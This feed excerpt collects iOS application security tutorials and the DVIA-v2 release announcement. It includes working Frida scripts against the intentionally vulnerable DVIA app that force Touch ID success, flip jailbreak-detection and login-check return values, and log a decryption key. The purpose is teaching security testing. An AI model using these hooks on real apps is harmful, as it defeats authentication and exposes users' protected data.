	    if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&amp;amp;authError]) {
	        [myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
	                  localizedReason:myLocalizedReasonString
	                            reply:^(BOOL success, NSError *error) {
	                                if (success) {
	                                    dispatch_async(dispatch_get_main_queue(), ^{
	                                    [TouchIDAuthentication showAlert:@&quot;Success&quot; withTitle:@&quot;Authentication Successful&quot;];
	                                    });
	                                } else {
	                                    dispatch_async(dispatch_get_main_queue(), ^{
	                                       [TouchIDAuthentication showAlert:@&quot;Error&quot; withTitle:@&quot;Authentication Failed !!&quot;];
	                                    });
	                                }
	                            }];
	    } else {
	        dispatch_async(dispatch_get_main_queue(), ^{
	            [TouchIDAuthentication showAlert:@&quot;Your device doesn't support Touch ID&quot; withTitle:@&quot;Error&quot;];
	        });
	    }
	}

&lt;/pre&gt;

&lt;p&gt;It is possible to just hook the evaluatePolicy:localizedReason:reply: method and make it return true. This can be done with the following Frida script.&lt;/p&gt;

&lt;pre&gt;	if(ObjC.available) {
		var hook = ObjC.classes.LAContext[&quot;- evaluatePolicy:localizedReason:reply:&quot;];
		Interceptor.attach(hook.implementation, {
			onEnter: function(args) {
				var block = new ObjC.Block(args[4]);
				const appCallback = block.implementation;
				block.implementation = function (error,value)  {
					const result = appCallback(1, null);
					return result;
				};
			},
		});
	} 

&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios50/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now go the Touch/Face ID Bypass -&amp;gt; Objective-C implementation in DVIA-v2 and tap on the fingerprint button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios50/2.PNG&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now put the incorrect fingerprint. You will see that since the method is hooked, the authentication is successful.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios50/3.PNG&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following function from DVIA-v2 shows the Swift implementation of the same thing. Since this can’t be manipulated, it can still be patched and the function flow could be modified to go inside the if loop directly. The patching can be done with Hopper followed by signing with jtool.&lt;/p&gt;

&lt;pre&gt;	@IBAction func touchIDTapped(_ sender: Any) {
	        let context = LAContext()
	        var error: NSError?

	        if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &amp;amp;error) {
	            let reason = &quot;Please authenticate yourself&quot;

	            context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: reason) {
	                [unowned self] success, authenticationError in

	                DispatchQueue.main.async {
	                    if success {
	                        DVIAUtilities.showAlert(title: &quot;Success&quot;, message: &quot;Authentication Successful&quot;, viewController: self)
	                    } else {
	                        DVIAUtilities.showAlert(title: &quot;Error&quot;, message: &quot;Authentication Failed&quot;, viewController: self)
	                    }
	                }
	            }
	        } else {
	           DVIAUtilities.showAlert(title: &quot;Touch ID not available&quot;, message: &quot;Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device&quot;, viewController: self)
	        }
	    }
&lt;/pre&gt;

&lt;p&gt;In general, the vulnerability arises from the fact that the authentication and the resulting action after a successful authentication are independent of each other. A better way to securely save the data would be to save the data in the keychain and protect it with appropriate keychain attributes (for e.g ksecattraccessiblewhenpasscodesetthisdeviceonly), which require touch ID or device passcode authentication to access the keychain content. This will make it harder for the attacker to get the data since to gather the information from the keychain the user would actually have to authenticate with Touch ID or enter the passcode, depending on which access control he applied, and also the logic is managed by the OS and not the application. Even though biometric authentication via the Local Authentication framework is easy to implement, it is not recommended to be used for sensitive applications, such as banking or other financial apps.&lt;/p&gt;

&lt;p&gt;In the next article, we will look at dumping unencrypted IPAs from the device and dynamic instrumentation on a non-jailbroken device using Frida.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 49 - Runtime Patching with Frida</title>
   <link href="https://bitbrain.github.io/2018/07/24/ios-application-security-part-49-runtime-patching-with-frida.html"/>
   <updated>2018-07-24T17:42:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/24/ios-application-security-part-49-runtime-patching-with-frida</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at Frida APIs and some examples of how to hook into methods, log the arguments, find the return value etc. In this article, we will look at how we can use Frida to do runtime patching of the application. Specifically, we will solve the following 2 challenges in DVIA-v2. You can download the Swift version of the app from damnvulnerableiosapp.com. An app can still have some sections in Objective-C which can be swizzled and this is what we will be taking advantage of in this article.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Jailbreak Detection Bypass (Jailbreak Detection -&amp;gt; Jailbreak Test 2)&lt;/li&gt;
  &lt;li&gt;Login Bypass (Runtime Manipulation -&amp;gt; Login Method 1)&lt;/li&gt;
&lt;/ol&gt;

&lt;!--more--&gt;

&lt;p&gt;Let’s attach to the application first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios49/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A quick reverse and subsequent trace of the application shows the method that is of interest. Since this method is Objective-C it can be swizzled.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios49/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use the following code to log the return value.&lt;/p&gt;

&lt;pre&gt;	var classname = &quot;JailbreakDetection&quot;;
	var methodname= &quot;isJailbroken&quot;;
	var hook = ObjC.classes[classname][methodname];
	Interceptor.attach(hook.implementation, {
	  onLeave: function(retvalue) {
	    // args[0] is self
	    // args[1] is selector 
	    // args[2] is the return value
	    console.log(&quot;\nReturnValue:&quot;
	        + retvalue + &quot;\&quot;]&quot;);
	  }
	});
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios49/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the return value is 1, which means the device is detected as jailbroken. Our task is to bypass this check. So we need to make the return value as 1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios49/4.PNG&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can do so with the following script. And let’s also throw an if condition to check if the Objective C runtime is available.&lt;/p&gt;

&lt;pre&gt;		if (ObjC.available){
		var classname = &quot;JailbreakDetection&quot;;
		var methodname= &quot;isJailbroken&quot;;
		var hook = ObjC.classes[classname][methodname];
		Interceptor.attach(hook.implementation, {
		  onLeave: function(retvalue) {
		    // args[0] is self
		    // args[1] is selector 
		    // args[2] is the return value
			newretvalue = ptr(&quot;0x0&quot;);
			retvalue.replace(newretvalue);
		    console.log(&quot;\nNewReturnValue:&quot;
		        + retvalue + &quot;\&quot;]&quot;);
		  }
		});
		}
&lt;/pre&gt;

&lt;p&gt;And as we can see, now the device is detected as Not Jailbroken.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios49/6.PNG&quot; alt=&quot;6&quot; /&gt; &lt;img src=&quot;/images/posts/ios49/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s use the exact same technique to bypass the challenge for Login Bypass (Runtime Manipulation -&amp;gt; Login Method 1)&lt;/p&gt;

&lt;pre&gt;	
	if (ObjC.available){
	var classname = &quot;LoginValidate&quot;;
	var methodname= &quot;isLoginValidated&quot;;
	var hook = ObjC.classes[classname][methodname];
	Interceptor.attach(hook.implementation, {
	  onLeave: function(retvalue) {
	    // args[0] is self
	    // args[1] is selector 
	    // args[2] is the return value
		newretvalue = ptr(&quot;0x1&quot;);
		retvalue.replace(newretvalue);
	    console.log(&quot;\nNewReturnValue:&quot;
	        + retvalue + &quot;\&quot;]&quot;);
	  }
	});
	}

&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios49/8.PNG&quot; alt=&quot;8&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/images/posts/ios49/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the next article, we will look at some more examples of Frida.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 48 - Frida APIs</title>
   <link href="https://bitbrain.github.io/2018/07/24/ios-application-security-part-48-frida-apis.html"/>
   <updated>2018-07-24T05:18:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/24/ios-application-security-part-48-frida-apis</id>
   <content type="html">&lt;p&gt;In the previous article, we had a basic introduction to Frida. In this article, we will look at some of the APIs that Frida provides to automate a lot of this stuff.&lt;/p&gt;

&lt;p&gt;Frida provides APIs in Javascript, Swift and C to interact with apps. This can be used to perform injection, runtime manipulation, reading the memory etc. It also has an API in python but it is very high level and restricted at the moment. It still has been used to create many useful scripts that are invaluable for iOS app security assessments. The most powerful API at the moment is the javascript API. So let’s have a look at it. We will be performing the analysis on Damn Vulnerable iOS App.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;Let’s hook into the applicaiton using the frida CLI. The Frida CLI tries to imitate a lot of the same functionalities of Cycript. Since these APIs are javascript, all these can be used to create a javascript script which can be then loaded into any application with just manipulating the application specific parameters.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The full Javascript API can be found &lt;a href=&quot;https://www.frida.re/docs/javascript-api/&quot;&gt;here&lt;/a&gt;. Let’s have a look at some APIs. One of the most important APIs is the ObjC.available. This tells Frida whether the Objective-C runtime is loaded into the application. If it is available, you can use the ObjC.classes command to list the classes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This technique will also work for Swift apps, because Swift apps also run inside the Objective-C runtime. This output is for the Mail app written in Swift running on iOS 11.3.1.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can hence iterate through all the classes using the following script, where the hasOwnProperty method makes sure that the object is actually a class.&lt;/p&gt;

&lt;pre&gt;	function listClasses()
	{
	if (ObjC.available)
	                 {
	                     for (var className in ObjC.classes)
	                     {
	                         if (ObjC.classes.hasOwnProperty(className))
	                         {
	                             console.log(className);
	                         }
	                     }
	                 }
	                 else
	                 {
	                     console.log(&quot;Objective-C Runtime is not available!&quot;);
	                 }
	}
&lt;/pre&gt;

&lt;p&gt;Or you can use this one-liner Object.keys(ObjC.classes).forEach(function (className) { … });&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Process command can also be used to fetch a lot of valuable information about the running application. The last option, code signing policy can be used to tell Frida whether or not to run unsigned code. In case where Frida is used as a shared library on non-jailbroken devices (when compiling from source), this setting will be set to required.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can also print out the methods for a specific class with the following command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This can be then converted into a function and used whenever required.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the other most important APIs is Interceptor. This allows you to intercept calls to a particular method, log the arguments, modify the implementation etc. It is even possible to modify the arguments being sent to the methods.&lt;/p&gt;

&lt;p&gt;The API looks like Interceptor.attach(target, callbacks), where the target is the hook to the method and the callbacks determine the event within the function which could be when the method is called (onEnter: function (args)), in which case you can modify the arguments or log them or onLeave (onLeave: function (retval)), in which case you can modify the return value.&lt;/p&gt;

&lt;p&gt;Let’s try and print out the method arguments for a particular method when it is called. We know that the method +[RNDecryptor decryptData:withPassword:error:] is being called from Hopper.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s hook into this method +[RNDecryptor decryptData:withPassword:error:] in DVIA and print out the encryption key when it is called.&lt;/p&gt;

&lt;pre&gt;	var classname = &quot;RNDecryptor&quot;;
	var methodname= &quot;+ decryptData:withPassword:error:&quot;;
	var hook = ObjC.classes[classname][methodname];
	Interceptor.attach(hook.implementation, {
	  onEnter: function(args) {
	    // args[0] is self
	    // args[1] is selector 
	    // args[2] is the Data
	    // args[3] is the Password, or in this case the encryption key
	    // args[4] is the error
	    var enckey = ObjC.Object(args[3]);
	    console.log(&quot;\nEncryptionKey:&quot;
	        + enckey.toString() + &quot;\&quot;]&quot;);
	  }
	});
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following code will hook into the method “isJailbroken:” in DVIA and print out the return value when the function has finished executing.&lt;/p&gt;

&lt;pre&gt;	var classname = &quot;JailbreakDetectionVC&quot;;
	var methodname= &quot;- isJailbroken&quot;;
	var hook = ObjC.classes[classname][methodname];
	Interceptor.attach(hook.implementation, {
		onLeave: function(retvalue) {
	   	 console.log(&quot;ClassName: &quot; + classname);
	     console.log(&quot;MethodName: &quot; + methodname);
	     console.log(&quot;\tReturn Type: &quot; + typeof retvalue);
	     console.log(&quot;\tReturn Value: &quot; + retvalue);
	     } 
	});

&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios48/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the next article, we will look at how we can manipulate the return values of these functions.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;http://www.mopsled.com/2015/log-ios-method-arguments-with-frida/&lt;/li&gt;
  &lt;li&gt;https://github.com/interference-security/frida-scripts/&lt;/li&gt;
  &lt;li&gt;https://github.com/dweinstein/awesome-frida&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 47 - Inspecting Apps with Frida</title>
   <link href="https://bitbrain.github.io/2018/07/23/ios-application-security-part-47-inspecting-apps-with-frida.html"/>
   <updated>2018-07-23T15:48:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/23/ios-application-security-part-47-inspecting-apps-with-frida</id>
   <content type="html">&lt;p&gt;In this article, we will talk about Frida. Frida is a dynamic instumentation toolkit which can prove to be extremely useful in iOS application assessments. It can be used to assess apps on jailbroken and non-jailbroken devices (provided you have the source code) .We will look at all these examples in this and the coming few articles.&lt;/p&gt;

&lt;p&gt;Let’s start first with assessment over jailbroken devices. Frida basically works on a client-server model. The client is running on your computer and the server on the iOS device. To install frida on your computer, simple issue the following command.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/1.png&quot; alt=&quot;1&quot; /&gt; &lt;img src=&quot;/images/posts/ios47/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On your jailbroken device, add the source https://build.frida.re. Then go to search and search for Frida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/3.PNG&quot; alt=&quot;3&quot; /&gt; &lt;img src=&quot;/images/posts/ios47/4.PNG&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the important things is to make sure both the Frida versions on the iOS device and the computer are same. Otherwise, frida won’t work. Now ssh into your jailbroken device and you will see a process with the name frida-server which is running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From your computer, simply issue the command &lt;em&gt;frida-ps -U&lt;/em&gt;. Make sure the jailbroken device is connected to your computer over USB. If you get similar output, it means Frida is all set up and running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Actually, frida comes with a bunch of command line tools as can be seen here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Issuing the command frida-ps will just show you a list of the processes running on your computer. But we are interested in i-devices. Running the command frida-ls-devices will show all the devices connected to the computer. We can interface with this device with frida-ps -U command. If there are more than one devices, you will need to specify the UDID.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, so we are all set. Let’s now look at what we can do with Frida. In this case, we will be using the application Damn Vulnerable iOS app which you can download from &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;damnvulnerableiosapp.com&lt;/a&gt;. You might face issues with installing the older Objective C version of the app on iOS 10 or later versions because the original app was signed with SHA-1 but since iOS 10 Apple is using SHA-256 hashing algorithm. So you might need to unzip the IPA file, strip out the 64 bit architecture using jtool (or lipo) and then sign it. You can then repackage the app and install it again to the device using Cydia Impactor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To see a list of all the applications installed on the device along with their unique identifier, run the &lt;em&gt;frida-ps -Uai&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To see all the running apps, use the &lt;em&gt;frida-ps -Ua&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To attach to a specific process, run the &lt;em&gt;frida -U processname&lt;/em&gt; command. Make sure that the application is running in foreground on the device. The frida CLI can be used to emulate a lot of the features of Cycript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, in this article, we will look at the frida-trace CLI. This CLI can help you trace various method calls during the application runtime. This can be extremely useful in understanding the inner workings of the application. Its always a good idea to look at the help output as there are many options here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To trace a particular function, you can specify it with the -i option. You can also provide a regex in the method section as shown in the figure below. For e.g, in the example below, you can trace the Crypto calls.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/16.png&quot; alt=&quot;16&quot; /&gt; &lt;img src=&quot;/images/posts/ios47/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you use the -I option, you can determine which module from Frida do you want to include, which is essentially the dylib from where all functions will be retrieved.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/17.png&quot; alt=&quot;17&quot; /&gt; &lt;img src=&quot;/images/posts/ios47/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In case of DVIA (Objective-C version), you can go to the Broken Cryptography section and start the challenge. To trace a particular Objective C method, you can specify it with the -m option. If the method calls match the provided regex, you will see the output as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios47/14.png&quot; alt=&quot;14&quot; /&gt; &lt;img src=&quot;/images/posts/ios47/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is extremely useful in understanding the inner working of the application and the same info can be used to patch or bypass certain methods. In the next article, we will look at more examples of using Frida.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Releasing Damn Vulnerable iOS App v2.0 - written in Swift</title>
   <link href="https://bitbrain.github.io/2018/04/19/damn-vulnerable-ios-app-v2-swift-edition.html"/>
   <updated>2018-04-19T01:03:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/04/19/damn-vulnerable-ios-app-v2-swift-edition</id>
   <content type="html">&lt;p&gt;I am glad to release a completely new version of &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS App&lt;/a&gt; written in Swift 4. With developers now migrating to Swift for developing apps, it is important to have a testbed app for iOS in Swift. Though I have added some sections in Objective-C too which the users can test to learn Objective-C related vulns. &lt;img src=&quot;/images/posts/dvia2/dvia.png&quot; alt=&quot;1&quot; /&gt; The following vulnerabilities are covered in this version.&lt;/p&gt;

&lt;!--more--&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Local Data Storage&lt;/strong&gt; - Data Storage in Plist, UserDefaults, Keychain, CoreData, Webkit Cache, Realm, Couchbase and YapDatabase.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Jailbreak Detection&lt;/strong&gt; - 5 challenges in this section. Apart from the usual checks where you can use runtime manipulation and attach debuggers to bypass Jailbreak detection, users will have to mitigate scenarios where there is added runtime protection, use of inline functions, string obfuscation, and certain edge cases, for e.g the exiting of an app when a jailbroken device is detected.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Excessive Permissions&lt;/strong&gt; - A demo on how app permissions can be misused, as demonstrated by Krause originally.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Runtime Manipulation&lt;/strong&gt; - Use runtime manipulation to modify instance variables, bypass local login checks, and brute force pin codes. In some cases, you might have to attach a debugger.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Anti Anti Hooking/Debugging&lt;/strong&gt; - Enabling these will detect when a debugger or a runtime analysis tool such as Cycript is attached to the app. There is also detection for MobileSubstrate, SSLKillSwitch2 etc. Try and work your way around it and see if you can still solve other challenges with these limitations. Reverse &amp;amp; Patch, Patch, Patch !&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Binary Protection&lt;/strong&gt; - Do some binary analysis to identify whether ARC, PIE, Stack smashing is enabled. Find the signature used to sign the binary and the entitlements it has. Also check if the app is stripped of its symbols or not.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Touch/Face ID Bypass&lt;/strong&gt; - Bypass Touch ID authentication when insecure APIs (LAContext) are being used.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Phishing&lt;/strong&gt; - Demonstration of alerts generated by app that look like the ones generated from App Store, which can potentially be used for conducting phishing attacks. Original idea by Krause.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Side Channel Data Leakage&lt;/strong&gt; - Understand the different kinds of Side Channel Data leakage such as Device Logs, Pasteboard, App Screenshot, Keystroke Logging, Insecure APIs used for HTTP Cookies etc.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IPC Issues&lt;/strong&gt; - Solve this challenge to understand what can happen when an app is receiving requests via URL schemes from untrusted sources and doesn’t validate it properly.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Broken Cryptography&lt;/strong&gt; - Bypass 2 encryption and hashing implementations, one with AES and the other one with PBKDF2 with only few rounds of hashing.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Webview Issues&lt;/strong&gt; - Understand injections in Webviews.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Network Layer Security&lt;/strong&gt; - Capture traffic over HTTP and HTTPs. Bypass Certificate and Public Key Pinning. Also understand what is ATS (App Transport Security) and check whether it is implemented or not.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Application Patching&lt;/strong&gt; - Patch login checks, jailbreak detection methods, and in specific certain specific instructions used in the app.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Sensitive Information in Memory&lt;/strong&gt; - Dump the information from the memory to look at the sensitive data.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Data leakage to third parties&lt;/strong&gt; - Identify and Capture the data being leaked to third parties.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;installing-dvia-on-any-ios-device&quot;&gt;Installing DVIA on any iOS device&lt;/h2&gt;

&lt;p&gt;The best way to install DVIA on any device (jailbroken or not) is using &lt;a href=&quot;http://www.cydiaimpactor.com/&quot;&gt;Cydia Impactor&lt;/a&gt;. However, it would be ideal to have a jailbroken device for testing as most of the vulnerabilities can be exploited only with the use of a JB device.&lt;/p&gt;

&lt;h3 id=&quot;steps&quot;&gt;Steps&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Create an Apple ID https://appleid.apple.com/account.&lt;/li&gt;
  &lt;li&gt;Download &lt;em&gt;Impactor&lt;/em&gt;, make sure the device you want to install the app on is connected to your computer. Now drag and drop the &lt;em&gt;IPA&lt;/em&gt; file to &lt;em&gt;Impactor&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Enter your Apple ID credentials. App will install on the device.&lt;/li&gt;
  &lt;li&gt;Go to your device, &lt;em&gt;Settings -&amp;gt; General -&amp;gt; Device Management&lt;/em&gt;. Select the Apple ID you used to install the app. Click on &lt;em&gt;Verify App&lt;/em&gt; under DVIAv2.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;compiling-dvia-using-xcode&quot;&gt;Compiling DVIA using Xcode&lt;/h2&gt;

&lt;h3 id=&quot;steps-1&quot;&gt;Steps&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Clone the DVIA repo , git clone https://github.com/prateek147/DVIA-v2&lt;/li&gt;
  &lt;li&gt;cd to the project root directory where the &lt;em&gt;Podfile&lt;/em&gt; is present (/DVIA-v2/DVIA-v2). Then run &lt;em&gt;pod install&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Open the &lt;em&gt;DVIA-v2.xcworkspace&lt;/em&gt; file with Xcode. You can now directly run the app on a simulator.&lt;/li&gt;
  &lt;li&gt;For running on the device, go under Project settings in Xcode on the top left, head over to the &lt;em&gt;General&lt;/em&gt; tab and under &lt;em&gt;Signing&lt;/em&gt;, enter credentials for your Apple ID.&lt;/li&gt;
  &lt;li&gt;Now you can build and run the project on the device. You will have to trust the app again by going under Settings -&amp;gt; General -&amp;gt; Device Management.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;some-important-links&quot;&gt;Some Important Links&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Application Website - &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Here&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Github Page - &lt;a href=&quot;https://github.com/prateek147/DVIA-v2&quot;&gt;https://github.com/prateek147/DVIA-v2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download Page - &lt;a href=&quot;http://damnvulnerableiosapp.com#downloads&quot;&gt;Here&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;donate&quot;&gt;Donate&lt;/h2&gt;

&lt;p&gt;if you benefit from this project and want to make a contribution, please consider making a donation to The Juniper Fund (www.thejuniperfund.org/)&lt;/p&gt;

&lt;p&gt;The Juniper fund is focusing on high altitude workers involved with climbing and expedition support in the high mountains of Nepal. When a high altitude worker has an accident (death or debilitating injury), the impact to the family is devastating. The juniper fund provides funds to the affected families with a 3-Tier model - Cost of Living grant, vocational training and small business grant. For more information, visit &lt;a href=&quot;http://www.thejuniperfund.org&quot;&gt;www.thejuniperfund.org&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Or watch the videos below.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;314&quot; src=&quot;https://www.youtube.com/embed/HsV6jaA5J2I&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/6dHXcoF590E&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;p&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I am still working on the solutions and would post them in form of blog posts starting soon.&lt;/p&gt;

&lt;p&gt;For any questions, shoot me an email at Prateek at damnvulnerableiosapp.com or DM me on &lt;a href=&quot;https://twitter.com/prateekg147&quot;&gt;Twitter&lt;/a&gt;. For any bugs/functionalities, please raise them via the &lt;a href=&quot;https://github.com/prateek147/DVIA-v2&quot;&gt;Github&lt;/a&gt; page.&lt;/p&gt;

&lt;p&gt;Happy Hacking !&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 46 - App Transport Security</title>
   <link href="https://bitbrain.github.io/2016/06/23/ios-application-security-part-46-app-transport-security.html"/>
   <updated>2016-06-23T01:03:00+00:00</updated>
   <id>https://bitbrain.github.io/2016/06/23/ios-application-security-part-46-app-transport-security</id>
   <content type="html">&lt;p&gt;One of the most common misconfiguration issues that i find during testing iOS apps is the bypass of the App Transport Security feature introduced by Apple in iOS 9.&lt;/p&gt;

&lt;p&gt;Here’s an excerpt from Apple’s documentation about ATS.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Starting in iOS 9.0 and OS X v10.11, a new security feature called App Transport Security (ATS) is available to apps and is enabled by default. It improves the privacy and data integrity of connections between an app and web services by enforcing additional security requirements for HTTP-based networking requests. Specifically, with ATS enabled, HTTP connections must use HTTPS (RFC 2818). Attempts to connect using insecure HTTP fail. Furthermore, HTTPS requests must use best practices for secure communications.&lt;/em&gt;&lt;/p&gt;

